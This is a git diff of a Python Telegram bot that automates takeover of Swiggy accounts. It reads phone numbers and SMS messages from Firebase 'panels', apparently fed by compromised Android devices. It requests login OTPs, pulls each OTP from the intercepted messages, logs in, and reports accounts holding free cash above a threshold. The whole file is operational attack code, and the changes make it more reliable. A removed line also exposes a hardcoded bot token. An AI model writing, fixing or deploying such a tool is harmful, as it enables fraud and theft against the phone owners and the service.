@@ -1,17 +1,19 @@
 #!/usr/bin/env python3
 """
 Swiggy TG Bot — Private Panel Per User + Single Number Check
+Fixed for stable Railway deployment.
 """
 
 import asyncio
+import csv
 import json
 import logging
 import os
 import re
+import signal
 import sys
 import time
 import base64
-import csv
 import random
 import uuid
 import urllib.parse
@@ -38,65 +40,113 @@ from telegram.ext import (
 )
 from telegram.error import TelegramError
 
-NL = "\n"
+# ─── Config ───────────────────────────────────────────────────────────────────
 
 logging.basicConfig(
-    format="%(asctime)s [%(levelname)s] %(message)s",
+    format="%(asctime)s [%(levelname)s] %(name)s – %(message)s",
     level=logging.INFO,
     datefmt="%H:%M:%S",
+    stream=sys.stdout,
 )
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8646908060:AAGTZni_boQhI8h4gFBpTh0z2kW0ExDBU34")
-ADMIN_IDS = {1446058092, 6894923643}
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+ADMIN_IDS: set[int] = {
+    int(x) for x in os.environ.get("ADMIN_IDS", "1446058092,6894923643").split(",") if x.strip()
+}
 
 REQUIRED_CHANNELS = [
-    {"username": "blankkdealz", "url": "https://t.me/blankkdealz", "label": "Blank Dealz"},
-    {"username": "earnwithsakx", "url": "https://t.me/earnwithsakx", "label": "Earn With Sakx"},
-    {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat", "label": "Blank Dealz Chat"},
+    {"username": "blankkdealz",     "url": "https://t.me/blankkdealz",      "label": "📢 Blank Dealz"},
+    {"username": "earnwithsakx",    "url": "https://t.me/earnwithsakx",     "label": "💰 Earn With Sakx"},
+    {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat",  "label": "💬 Blank Dealz Chat"},
 ]
 
 DEFAULT_CAMPAIGN_ID = "ougwl_MjU3MTUyNzI0I1JhaHVs"
-DEFAULT_SENDER = "SWIGGY"
-DEFAULT_THRESHOLD = 190
-DEFAULT_WORKERS = 15
-OTP_TIMEOUT = 30
-POLL_INTERVAL = 0.5
-REFERRALS_FOR_1H = 3
-ACCESS_HOURS = 1
+DEFAULT_SENDER      = "SWIGGY"
+DEFAULT_THRESHOLD   = 190
+DEFAULT_WORKERS     = 15
+OTP_TIMEOUT         = 30
+POLL_INTERVAL       = 0.5
+REFERRALS_FOR_1H    = 3
+ACCESS_HOURS        = 1
 
-STATE_FILE = Path(__file__).parent / "bot_state.json"
-USERS_FILE = Path(__file__).parent / "users.json"
-USER_PANELS_FILE = Path(__file__).parent / "user_panels.json"
-RESULTS_DIR = Path(__file__).parent / "results"
-RESULTS_DIR.mkdir(exist_ok=True)
+NL = "\n"
 
+# Storage paths — use /tmp on Railway if the working dir is read-only
+_BASE = Path(os.environ.get("DATA_DIR", Path(__file__).parent))
+STATE_FILE       = _BASE / "bot_state.json"
+USERS_FILE       = _BASE / "users.json"
+USER_PANELS_FILE = _BASE / "user_panels.json"
+RESULTS_DIR      = _BASE / "results"
+RESULTS_DIR.mkdir(parents=True, exist_ok=True)
 
-def load_json(path, default):
+# ─── Persistent Storage ───────────────────────────────────────────────────────
+
+def load_json(path: Path, default):
     if path.exists():
         try:
             with open(path, "r") as f:
                 return json.load(f)
         except Exception as e:
-            logger.error(f"Error loading {path}: {e}")
+            logger.error("Error loading %s: %s", path, e)
     return default
 
 
-def save_json(path, data):
+def save_json(path: Path, data):
     try:
-        with open(path, "w") as f:
+        tmp = path.with_suffix(".tmp")
+        with open(tmp, "w") as f:
             json.dump(data, f, indent=2)
+        tmp.replace(path)          # atomic replace — avoids partial writes
     except Exception as e:
-        logger.error(f"Error saving {path}: {e}")
+        logger.error("Error saving %s: %s", path, e)
 
 
-def load_state():
-    return load_json(STATE_FILE, {})
+def load_users() -> dict:
+    return load_json(USERS_FILE, {})
 
 
-def save_state(s):
-    save_json(STATE_FILE, s)
+def save_users(u: dict):
+    save_json(USERS_FILE, u)
 
+
+def get_user(uid: int) -> Optional[dict]:
+    return load_users().get(str(uid))
+
+
+def upsert_user(uid: int, **kwargs) -> dict:
+    users = load_users()
+    key = str(uid)
+    if key not in users:
+        users[key] = {
+            "username": "",
+            "access_expiry": 0,
+            "referrals_given": 0,
+            "referred_by": None,
+            "joined_at": int(time.time()),
+        }
+    users[key].update(kwargs)
+    save_users(users)
+    return users[key]
+
+
+def has_access(uid: int) -> bool:
+    if uid in ADMIN_IDS:
+        return True
+    u = get_user(uid)
+    return bool(u and u.get("access_expiry", 0) > time.time())
+
+
+def grant_access_hours(uid: int, hours: int = ACCESS_HOURS) -> float:
+    u = get_user(uid)
+    now = time.time()
+    current_expiry = u.get("access_expiry", now) if u else now
+    new_expiry = max(current_expiry, now) + hours * 3600
+    upsert_user(uid, access_expiry=new_expiry)
+    return new_expiry
+
+
+# ─── Panel Storage ────────────────────────────────────────────────────────────
 
 def load_user_panels() -> dict:
     return load_json(USER_PANELS_FILE, {})
@@ -107,8 +157,7 @@ def save_user_panels(data: dict):
 
 
 def get_user_panels(uid: int) -> dict:
-    all_panels = load_user_panels()
-    return all_panels.get(str(uid), {})
+    return load_user_panels().get(str(uid), {})
 
 
 def add_user_panel(uid: int, panel_data: dict) -> str:
@@ -132,55 +181,7 @@ def remove_user_panel(uid: int, panel_id: str) -> bool:
     return False
 
 
-def load_users() -> dict:
-    return load_json(USERS_FILE, {})
-
-
-def save_users(u: dict):
-    save_json(USERS_FILE, u)
-
-
-def get_user(uid: int) -> dict | None:
-    return load_users().get(str(uid))
-
-
-def upsert_user(uid: int, **kwargs):
-    users = load_users()
-    key = str(uid)
-    if key not in users:
-        users[key] = {
-            "username": "",
-            "access_expiry": 0,
-            "referrals_given": 0,
-            "referred_by": None,
-            "joined_at": int(time.time()),
-        }
-    users[key].update(kwargs)
-    save_users(users)
-    return users[key]
-
-
-def has_access(uid: int) -> bool:
-    if uid in ADMIN_IDS:
-        return True
-    u = get_user(uid)
-    if not u:
-        return False
-    return u.get("access_expiry", 0) > time.time()
-
-
-def grant_access_hours(uid: int, hours: int = ACCESS_HOURS) -> float:
-    u = get_user(uid)
-    now = time.time()
-    current_expiry = u.get("access_expiry", now) if u else now
-    new_expiry = max(current_expiry, now) + hours * 3600
-    upsert_user(uid, access_expiry=new_expiry)
-    return new_expiry
-
-
-def get_all_user_ids() -> list[int]:
-    return [int(k) for k in load_users().keys()]
-
+# ─── Channel Gate ─────────────────────────────────────────────────────────────
 
 async def check_channels(bot, uid: int) -> list[dict]:
     not_joined = []
@@ -196,9 +197,11 @@ async def check_channels(bot, uid: int) -> list[dict]:
 
 def channel_join_keyboard(not_joined: list[dict]) -> InlineKeyboardMarkup:
     buttons = [[InlineKeyboardButton(ch["label"], url=ch["url"])] for ch in not_joined]
-    buttons.append([InlineKeyboardButton("I've Joined - Check", callback_data="check_join")])
+    buttons.append([InlineKeyboardButton("✅ I've Joined — Check Now", callback_data="check_join")])
     return InlineKeyboardMarkup(buttons)
 
+
+# ─── User Session (per-user scraper state) ────────────────────────────────────
 
 class UserSession:
     def __init__(self, uid: int):
@@ -218,13 +221,13 @@ class UserSession:
         return self.session
 
     async def close(self):
-        for task in self.running_tasks.values():
+        self.is_running = False
+        for task in list(self.running_tasks.values()):
             task.cancel()
         self.running_tasks.clear()
         if self.session and not self.session.closed:
             await self.session.close()
         self.session = None
-        self.is_running = False
 
     def reset_results(self):
         self.results = []
@@ -254,6 +257,7 @@ class SessionManager:
 
 session_manager = SessionManager()
 
+# ─── Helpers ──────────────────────────────────────────────────────────────────
 
 def generate_csrf() -> str:
     chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
@@ -272,7 +276,15 @@ def random_user_agent() -> str:
     )
 
 
-def _normalize_firebase_url(url: str, key: str = "") -> tuple:
+def random_coordinates() -> Tuple[str, str]:
+    lat = 23.52 + random.uniform(-0.01, 0.01)
+    lng = 77.81 + random.uniform(-0.01, 0.01)
+    return str(round(lat, 7)), str(round(lng, 7))
+
+
+# ─── Firebase / Panel URL Parsing ─────────────────────────────────────────────
+
+def _normalize_firebase_url(url: str, key: str = "") -> Tuple[str, str]:
     url = url.strip().rstrip("/")
     if url.startswith("http"):
         parsed = urllib.parse.urlparse(url)
@@ -339,17 +351,17 @@ def decode_merge_panels(panel_url: str) -> list:
                 if u:
                     panels.append(_normalize_firebase_url(u, k))
     except Exception as e:
-        logger.error(f"decode_merge_panels parse error: {e}")
+        logger.error("decode_merge_panels parse error: %s", e)
     return panels
 
 
-def get_panel_api_url(panel_url: str):
+def get_panel_api_url(panel_url: str) -> Tuple[Optional[str], str]:
     parsed_pre = urllib.parse.urlparse(panel_url)
     if parsed_pre.fragment.startswith("merge="):
         panels = decode_merge_panels(panel_url)
         if panels:
             return panels[0]
-        return None, None
+        return None, ""
 
     panel_url_clean = panel_url.split("#")[0]
     parsed = urllib.parse.urlparse(panel_url_clean)
@@ -357,9 +369,9 @@ def get_panel_api_url(panel_url: str):
 
     s_param = qs.get("s", [""])[0]
     if s_param:
-        s_param_padded = s_param + "=" * ((4 - len(s_param) % 4) % 4)
+        s_padded = s_param + "=" * ((4 - len(s_param) % 4) % 4)
         try:
-            decoded = base64.b64decode(s_param_padded).decode("utf-8")
+            decoded = base64.b64decode(s_padded).decode("utf-8")
             for sep in ["|||", "|"]:
                 if sep in decoded:
                     parts = decoded.split(sep)
@@ -395,11 +407,8 @@ def get_panel_api_url(panel_url: str):
 
 def fb_url(base: str, auth_key: str = "", **extra) -> str:
     params = {}
-    if auth_key:
-        if auth_key.startswith("http"):
-            auth_key = ""
-        if auth_key:
-            params["auth"] = auth_key
+    if auth_key and not auth_key.startswith("http"):
+        params["auth"] = auth_key
     params.update(extra)
     if not params:
         return base
@@ -417,24 +426,31 @@ async def fb_fetch(client: httpx.AsyncClient, url: str, timeout: int = 10):
         return None, str(e)
 
 
+# ─── Phone Fetching ───────────────────────────────────────────────────────────
+
 async def fetch_phones_async(
     client: httpx.AsyncClient, api_url: str, auth_key: str, limit: int = 100
 ) -> List[Tuple[str, str]]:
+    """Fetch phone numbers from Firebase panel (async, with status check)."""
     if not api_url:
         return []
     base = api_url.rstrip("/") + "/"
 
-    clients_data, _ = await fb_fetch(client, fb_url(f"{base}clients/.json", auth_key))
+    clients_data, err = await fb_fetch(client, fb_url(f"{base}clients/.json", auth_key))
     if not clients_data or not isinstance(clients_data, dict):
-        clients_data, _ = await fb_fetch(client, fb_url(f"{base}devices/.json", auth_key))
+        clients_data, err = await fb_fetch(client, fb_url(f"{base}devices/.json", auth_key))
     if not clients_data or not isinstance(clients_data, dict):
+        logger.warning("fetch_phones_async: no clients/devices found. err=%s", err)
         return []
 
-    phones = []
+    phones: List[Tuple[str, str]] = []
     for c_id, c_data in clients_data.items():
         if len(phones) >= limit:
             break
         if not isinstance(c_data, dict):
+            continue
+        # Only process active devices (matches second-script behaviour)
+        if not c_data.get("status"):
             continue
         phone = (
             c_data.get("mobNo")
@@ -449,9 +465,8 @@ async def fetch_phones_async(
             if len(phone) == 10 and phone[0] in "6789":
                 phones.append((phone, c_id))
                 continue
-        msgs_data, _ = await fb_fetch(
-            client, fb_url(f"{base}messages/{c_id}/.json", auth_key)
-        )
+        # Fallback: scan messages for a phone number
+        msgs_data, _ = await fb_fetch(client, fb_url(f"{base}messages/{c_id}/.json", auth_key))
         if msgs_data and isinstance(msgs_data, dict):
             for msg in msgs_data.values():
                 if not isinstance(msg, dict):
@@ -463,6 +478,8 @@ async def fetch_phones_async(
                     break
     return phones
 
+
+# ─── OTP Polling ──────────────────────────────────────────────────────────────
 
 async def poll_otp_from_panel(
     firebase_url: str,
@@ -484,9 +501,7 @@ async def poll_otp_from_panel(
             url = f"{base_url}messages/{device_id}.json"
             if api_key:
                 url += f"?auth={api_key}"
-            async with session.get(
-                url, timeout=aiohttp.ClientTimeout(total=5)
-            ) as resp:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                 if resp.status != 200:
                     await asyncio.sleep(poll_interval)
                     continue
@@ -499,10 +514,7 @@ async def poll_otp_from_panel(
                     if not isinstance(msg_data, dict):
                         continue
                     msg_ts = None
-                    for field in [
-                        "timestamp", "time", "sentTimestamp",
-                        "date", "createdAt", "id",
-                    ]:
+                    for field in ["timestamp", "time", "sentTimestamp", "date", "createdAt", "id"]:
                         if field in msg_data and msg_data[field]:
                             try:
                                 msg_ts = int(msg_data[field])
@@ -535,22 +547,24 @@ async def poll_otp_from_panel(
     return None
 
 
+# ─── Swiggy API Client ────────────────────────────────────────────────────────
+
 class SwiggyClient:
     def __init__(self, session: aiohttp.ClientSession):
         self.session = session
         self.csrf = generate_csrf()
         self.device_id = generate_uuid()
-        self.tid = None
-        self.token = None
-        self.user_id = None
+        self.tid: Optional[str] = None
+        self.token: Optional[str] = None
+        self.user_id: Optional[str] = None
 
-    def _build_headers(self, extra: dict = None) -> dict:
+    def _base_headers(self, extra: Optional[dict] = None) -> dict:
         headers = {
             "accept": "*/*",
             "content-type": "application/json",
             "origin": "https://www.swiggy.com",
             "referer": "https://www.swiggy.com/auth",
-            "sec-ch-ua": '"Android WebView";v="149", "Chromium";v="149"',
+            "sec-ch-ua": '"Android WebView";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
             "sec-ch-ua-mobile": "?1",
             "sec-ch-ua-platform": '"Android"',
             "user-agent": random_user_agent(),
@@ -560,18 +574,12 @@ class SwiggyClient:
         return headers
 
     async def send_otp(self, phone: str) -> bool:
-        signin_url = "https://www.swiggy.com/mapi/auth/signin-check"
-        signin_data = {
-            "mobile": phone,
-            "countryCode": "91",
-            "countryKey": "IN",
-            "_csrf": self.csrf,
-        }
+        """Check registration and send OTP. Returns True on success."""
         try:
             async with self.session.post(
-                signin_url,
-                json=signin_data,
-                headers=self._build_headers(),
+                "https://www.swiggy.com/mapi/auth/signin-check",
+                json={"mobile": phone, "countryCode": "91", "countryKey": "IN", "_csrf": self.csrf},
+                headers=self._base_headers(),
                 timeout=aiohttp.ClientTimeout(total=10),
             ) as resp:
                 if resp.status != 200:
@@ -579,30 +587,29 @@ class SwiggyClient:
                 data = await resp.json()
                 if not data.get("data", {}).get("registered", False):
                     return False
-        except Exception:
+        except Exception as e:
+            logger.debug("send_otp signin-check error: %s", e)
             return False
 
-        otp_url = "https://www.swiggy.com/mapi/auth/sms-otp"
-        otp_data = {"mobile": phone, "_csrf": self.csrf}
         try:
             async with self.session.post(
-                otp_url,
-                json=otp_data,
-                headers=self._build_headers(),
+                "https://www.swiggy.com/mapi/auth/sms-otp",
+                json={"mobile": phone, "_csrf": self.csrf},
+                headers=self._base_headers(),
                 timeout=aiohttp.ClientTimeout(total=10),
             ) as resp:
                 return resp.status == 200
-        except Exception:
+        except Exception as e:
+            logger.debug("send_otp sms-otp error: %s", e)
             return False
 
     async def verify_otp(self, phone: str, otp: str) -> bool:
-        verify_url = "https://www.swiggy.com/mapi/auth/otp-verify"
-        verify_data = {"otp": otp, "_csrf": self.csrf}
+        """Verify OTP and store auth tokens. Returns True on success."""
         try:
             async with self.session.post(
-                verify_url,
-                json=verify_data,
-                headers=self._build_headers(),
+                "https://www.swiggy.com/mapi/auth/otp-verify",
+                json={"otp": otp, "_csrf": self.csrf},
+                headers=self._base_headers(),
                 timeout=aiohttp.ClientTimeout(total=10),
             ) as resp:
                 if resp.status != 200:
@@ -612,25 +619,36 @@ class SwiggyClient:
                     return False
                 self.token = data.get("data", {}).get("token")
                 self.tid = data.get("tid")
-                self.user_id = str(data.get("data", {}).get("customer_id"))
+                self.user_id = str(data.get("data", {}).get("customer_id", ""))
                 return bool(self.token and self.tid)
-        except Exception:
+        except Exception as e:
+            logger.debug("verify_otp error: %s", e)
             return False
 
     async def get_free_cash(self, campaign_id: str) -> Optional[int]:
+        """Fetch rolling free cash balance. Returns integer rupee amount or None."""
         if not self.token or not self.tid:
             return None
-        url = "https://spns.swiggy.com/api/v1/campaign/rewards"
+        # Full headers from second-script (more complete = fewer API rejections)
         headers = {
+            "accept": "*/*",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
             "client-id": "portal",
+            "content-type": "application/json",
+            "origin": "https://webviews.swiggy.com",
+            "priority": "u=1, i",
+            "referer": "https://webviews.swiggy.com/",
+            "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
             "tid": self.tid,
             "token": self.token,
             "user-agent": random_user_agent(),
-            "content-type": "application/json",
-            "accept": "*/*",
-            "origin": "https://webviews.swiggy.com",
             "x-requested-with": "in.swiggy.android",
-            "referer": "https://webviews.swiggy.com/",
         }
         payload = {
             "generalContext": {"requestContext": {"clientId": "portal_invite"}},
@@ -651,7 +669,7 @@ class SwiggyClient:
         }
         try:
             async with self.session.post(
-                url,
+                "https://spns.swiggy.com/api/v1/campaign/rewards",
                 json=payload,
                 headers=headers,
                 timeout=aiohttp.ClientTimeout(total=15),
@@ -661,13 +679,10 @@ class SwiggyClient:
                 data = await resp.json()
                 if data.get("statusCode") != 0:
                     return None
-                reward_responses = data.get("data", {}).get(
-                    "campaignRewardResponses", []
-                )
+                reward_responses = data.get("data", {}).get("campaignRewardResponses", [])
                 if not reward_responses:
                     return None
-                rewards = reward_responses[0].get("rewards", [])
-                for reward in rewards:
+                for reward in reward_responses[0].get("rewards", []):
                     if reward.get("rewardType") == "REWARD_TYPE_ROLLING_FREECASH":
                         total_str = (
                             reward.get("rollingFreecash", {})
@@ -679,21 +694,31 @@ class SwiggyClient:
                         except (ValueError, TypeError):
                             return 0
                 return 0
-        except Exception:
+        except Exception as e:
+            logger.debug("get_free_cash error: %s", e)
             return None
 
 
+# ─── Scraper Core ─────────────────────────────────────────────────────────────
+
 async def process_phone(
-    phone, device_id, api_url, auth_key, sender_keyword,
-    campaign_id, threshold, user_session, progress_callback=None,
-):
+    phone: str,
+    device_id: str,
+    api_url: str,
+    auth_key: str,
+    sender_keyword: str,
+    campaign_id: str,
+    threshold: int,
+    user_session: UserSession,
+    progress_callback=None,
+) -> Optional[dict]:
     async with user_session.semaphore:
         session = await user_session.get_session()
         client = SwiggyClient(session)
 
         if not await client.send_otp(phone):
             if progress_callback:
-                await progress_callback(phone, "OTP failed")
+                await progress_callback(phone, "❌ OTP send failed")
             return None
 
         trigger_time = int(time.time() * 1000)
@@ -707,12 +732,12 @@ async def process_phone(
         )
         if not otp:
             if progress_callback:
-                await progress_callback(phone, "OTP timeout")
+                await progress_callback(phone, "⏱ OTP timeout")
             return None
 
         if not await client.verify_otp(phone, otp):
             if progress_callback:
-                await progress_callback(phone, "Verify failed")
+                await progress_callback(phone, "❌ Verify failed")
             return None
 
         free_cash = await client.get_free_cash(campaign_id)
@@ -720,7 +745,7 @@ async def process_phone(
 
         if free_cash is None:
             if progress_callback:
-                await progress_callback(phone, "Cash error")
+                await progress_callback(phone, "⚠️ Cash fetch error")
             return None
 
         if free_cash >= threshold:
@@ -735,15 +760,23 @@ async def process_phone(
             }
             user_session.results.append(result)
             if progress_callback:
-                await progress_callback(phone, "FOUND " + str(free_cash))
+                await progress_callback(phone, f"✅ FOUND ₹{free_cash}")
             return result
         else:
             if progress_callback:
-                await progress_callback(phone, "low " + str(free_cash))
+                await progress_callback(phone, f"low ₹{free_cash}")
             return None
 
 
-async def run_scraper(uid, app, panel_key, sender_keyword, campaign_id, threshold, phone_limit=100):
+async def run_scraper(
+    uid: int,
+    app,
+    panel_key: str,
+    sender_keyword: str,
+    campaign_id: str,
+    threshold: int,
+    phone_limit: int = 100,
+):
     us = await session_manager.get(uid)
     if us.is_running:
         return
@@ -754,7 +787,7 @@ async def run_scraper(uid, app, panel_key, sender_keyword, campaign_id, threshol
     panel_config = my_panels.get(panel_key)
     if not panel_config:
         try:
-            await app.bot.send_message(uid, "Panel not found.")
+            await app.bot.send_message(uid, "⚠️ Panel not found. Use Add My Panel to re-add it.")
         except Exception:
             pass
         us.is_running = False
@@ -766,24 +799,31 @@ async def run_scraper(uid, app, panel_key, sender_keyword, campaign_id, threshol
 
     status_msg = None
     try:
-        msg = NL.join([
-            "Scraper Starting...",
-            "Panel: " + panel_name,
-            "Threshold: Rs " + str(threshold),
-            "Workers: " + str(DEFAULT_WORKERS),
-            "Fetching phones...",
-        ])
-        status_msg = await app.bot.send_message(uid, msg)
+        status_msg = await app.bot.send_message(
+            uid,
+            f"🔍 *Scraper Starting...*\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"📋 Panel: `{panel_name}`\n"
+            f"💰 Threshold: ₹{threshold}\n"
+            f"⚙️ Workers: {DEFAULT_WORKERS}\n"
+            f"📲 Fetching devices...",
+            parse_mode="Markdown",
+        )
     except Exception:
         pass
 
-    phones = []
-    async with httpx.AsyncClient() as fb_client:
-        phones = await fetch_phones_async(fb_client, api_url, auth_key, limit=phone_limit)
+    phones: List[Tuple[str, str]] = []
+    try:
+        async with httpx.AsyncClient() as fb_client:
+            phones = await fetch_phones_async(fb_client, api_url, auth_key, limit=phone_limit)
+    except Exception as e:
+        logger.error("fetch_phones_async failed: %s", e)
 
     if not phones:
         try:
-            await app.bot.send_message(uid, "No phones found in your panel.")
+            await app.bot.send_message(
+                uid, "❌ No active devices found in your panel.\nMake sure your panel has devices with `status: true`."
+            )
         except Exception:
             pass
         us.is_running = False
@@ -792,29 +832,47 @@ async def run_scraper(uid, app, panel_key, sender_keyword, campaign_id, threshol
     total = len(phones)
     last_update = time.time()
 
-    async def on_progress(phone, status):
+    try:
+        if status_msg:
+            await app.bot.edit_message_text(
+                f"🚀 *Scan Running*\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"📋 Panel: `{panel_name}`\n"
+                f"📱 Devices found: {total}\n"
+                f"💰 Threshold: ₹{threshold}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"⏳ Starting...",
+                uid,
+                status_msg.message_id,
+                parse_mode="Markdown",
+            )
+    except Exception:
+        pass
+
+    async def on_progress(phone: str, status: str):
         nonlocal last_update
         now = time.time()
         if now - last_update < 3:
             return
         last_update = now
         try:
-            text = NL.join([
-                "Scanning...",
-                "Scanned: " + str(us.total_scanned) + "/" + str(total),
-                "Found: " + str(us.total_found),
-                "Last: " + phone + " -> " + status,
-            ])
             if status_msg:
-                await app.bot.edit_message_text(text, uid, status_msg.message_id)
+                await app.bot.edit_message_text(
+                    f"🚀 *Scanning...*\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"📊 Scanned: {us.total_scanned}/{total}\n"
+                    f"✅ Found:   {us.total_found}\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"Last: `{phone}` → {status}",
+                    uid,
+                    status_msg.message_id,
+                    parse_mode="Markdown",
+                )
         except Exception:
             pass
 
     tasks = [
-        process_phone(
-            phone, device, api_url, auth_key,
-            sender_keyword, campaign_id, threshold, us, on_progress
-        )
+        process_phone(phone, device, api_url, auth_key, sender_keyword, campaign_id, threshold, us, on_progress)
         for phone, device in phones
     ]
 
@@ -823,66 +881,87 @@ async def run_scraper(uid, app, panel_key, sender_keyword, campaign_id, threshol
     except asyncio.CancelledError:
         pass
 
+    # Save results to CSV
     if us.results:
         filename = RESULTS_DIR / f"uid{uid}_{int(time.time())}.csv"
-        with open(filename, "w", newline="", encoding="utf-8") as f:
-            writer = csv.DictWriter(f, fieldnames=us.results[0].keys())
-            writer.writeheader()
-            writer.writerows(us.results)
+        try:
+            with open(filename, "w", newline="", encoding="utf-8") as f:
+                writer = csv.DictWriter(f, fieldnames=us.results[0].keys())
+                writer.writeheader()
+                writer.writerows(us.results)
+        except Exception as e:
+            logger.error("CSV write error: %s", e)
 
+    # Final summary
     lines = [
-        "Scan Complete!",
-        "Total Scanned: " + str(us.total_scanned),
-        "Found (>=Rs " + str(threshold) + "): " + str(us.total_found),
+        "✅ *Scan Complete!*",
+        "━━━━━━━━━━━━━━━━━━",
+        f"📊 Total Scanned: {us.total_scanned}",
+        f"🎯 Found ≥₹{threshold}: {us.total_found}",
     ]
     if us.results:
         lines.append("")
-        lines.append("Good Accounts:")
+        lines.append("🏆 *Good Accounts:*")
         for r in us.results[:20]:
-            lines.append("  " + r["phone"] + " -> Rs " + str(r["free_cash"]))
+            lines.append(f"  `{r['phone']}` → ₹{r['free_cash']}")
         if len(us.results) > 20:
-            lines.append("  ...and " + str(len(us.results) - 20) + " more")
+            lines.append(f"  _...and {len(us.results) - 20} more_")
         lines.append("")
-        lines.append("Full results saved to CSV")
+        lines.append("📁 Full results saved to CSV")
     else:
         lines.append("")
-        lines.append("No qualifying accounts found")
+        lines.append("😔 No qualifying accounts found.")
 
     try:
-        await app.bot.send_message(uid, NL.join(lines))
+        await app.bot.send_message(uid, NL.join(lines), parse_mode="Markdown")
     except Exception:
         pass
 
     us.is_running = False
 
 
-async def check_single_number_start(update, context):
+# ─── Single Number Check ──────────────────────────────────────────────────────
+
+async def check_single_number_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in ADMIN_IDS and not has_access(uid):
-        await update.message.reply_text("Access expired. Share your referral link to unlock!")
+        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
         return
-
     await update.message.reply_text(
-        NL.join([
-            "Check Single Number",
-            "",
-            "Send the 10-digit phone number you want to check.",
-            "Example: 9876543210",
-        ])
+        "🔢 *Check Single Number*\n\n"
+        "Send the 10-digit Indian mobile number you want to check.\n"
+        "Example: `9876543210`",
+        parse_mode="Markdown",
     )
     context.user_data["awaiting_check_phone"] = True
 
 
-async def check_single_number_otp(update, context):
+async def _close_check_session(context: ContextTypes.DEFAULT_TYPE):
+    """Helper to safely clean up a stored aiohttp session."""
+    stored_session = context.user_data.pop("check_session", None)
+    context.user_data.pop("check_client", None)
+    context.user_data.pop("check_phone", None)
+    context.user_data.pop("awaiting_check_otp", None)
+    context.user_data.pop("awaiting_check_phone", None)
+    if stored_session and not stored_session.closed:
+        try:
+            await stored_session.close()
+        except Exception:
+            pass
+
+
+async def check_single_number_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     phone_raw = update.message.text.strip()
-
     phone = re.sub(r"\D", "", phone_raw)
+
     if len(phone) != 10 or phone[0] not in "6789":
-        await update.message.reply_text("Invalid number. Send a valid 10-digit Indian mobile number (starts with 6-9).")
+        await update.message.reply_text(
+            "❌ Invalid number. Please send a valid 10-digit Indian mobile number (starts with 6–9)."
+        )
         return
 
-    await update.message.reply_text("Sending OTP to " + phone + "...")
+    await update.message.reply_text(f"📤 Sending OTP to `{phone}`...", parse_mode="Markdown")
 
     connector = aiohttp.TCPConnector(limit=0)
     session = aiohttp.ClientSession(connector=connector)
@@ -890,19 +969,19 @@ async def check_single_number_otp(update, context):
 
     try:
         sent = await client.send_otp(phone)
-    except Exception:
+    except Exception as e:
         await session.close()
-        await update.message.reply_text("Error sending OTP. Try again.")
+        await update.message.reply_text("⚠️ Error sending OTP. Please try again.")
         context.user_data.pop("awaiting_check_phone", None)
+        logger.debug("check_single_number_otp error: %s", e)
         return
 
     if not sent:
         await session.close()
         await update.message.reply_text(
-            NL.join([
-                "Failed to send OTP to " + phone + ".",
-                "Number may not be registered on Swiggy. Try another number.",
-            ])
+            f"❌ Could not send OTP to `{phone}`.\n"
+            "Number may not be registered on Swiggy, or Swiggy is rate-limiting. Try another number.",
+            parse_mode="Markdown",
         )
         context.user_data.pop("awaiting_check_phone", None)
         return
@@ -914,114 +993,144 @@ async def check_single_number_otp(update, context):
     context.user_data["awaiting_check_otp"] = True
 
     await update.message.reply_text(
-        NL.join([
-            "OTP sent to " + phone + "!",
-            "",
-            "Check your phone and send the OTP here.",
-            "You have 2 minutes before it expires.",
-        ])
+        f"✅ OTP sent to `{phone}`!\n\n"
+        "📩 Check your phone and send the OTP here.\n"
+        "⏰ You have 2 minutes before it expires.",
+        parse_mode="Markdown",
     )
 
     async def expire_otp():
         await asyncio.sleep(120)
         if context.user_data.get("awaiting_check_otp"):
-            context.user_data.pop("awaiting_check_otp", None)
-            context.user_data.pop("check_phone", None)
-            stored_client = context.user_data.pop("check_client", None)
-            stored_session = context.user_data.pop("check_session", None)
-            if stored_session and not stored_session.closed:
-                await stored_session.close()
+            await _close_check_session(context)
             try:
-                await context.bot.send_message(uid, "OTP expired. Use Check Number to try again.")
+                await context.bot.send_message(
+                    uid, "⏰ OTP expired. Use *Check Number* to try again.", parse_mode="Markdown"
+                )
             except Exception:
                 pass
 
     asyncio.create_task(expire_otp())
 
 
-async def check_single_number_verify(update, context):
+async def check_single_number_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     otp_raw = update.message.text.strip()
-
     otp = re.sub(r"\D", "", otp_raw)
-    if len(otp) < 4 or len(otp) > 6:
-        await update.message.reply_text("Invalid OTP. Send the 4-6 digit OTP you received.")
+
+    if not (4 <= len(otp) <= 6):
+        await update.message.reply_text("❌ Invalid OTP. Please send the 4–6 digit OTP you received.")
         return
 
     phone = context.user_data.get("check_phone", "")
-    client = context.user_data.get("check_client")
-    session = context.user_data.get("check_session")
+    client: Optional[SwiggyClient] = context.user_data.get("check_client")
+    session: Optional[aiohttp.ClientSession] = context.user_data.get("check_session")
 
     if not phone or not client or not session:
-        await update.message.reply_text("Session expired. Use Check Number to start again.")
+        await update.message.reply_text("⚠️ Session expired. Use *Check Number* to start again.", parse_mode="Markdown")
         context.user_data.pop("awaiting_check_otp", None)
         return
 
-    await update.message.reply_text("Verifying OTP...")
+    await update.message.reply_text("🔐 Verifying OTP...")
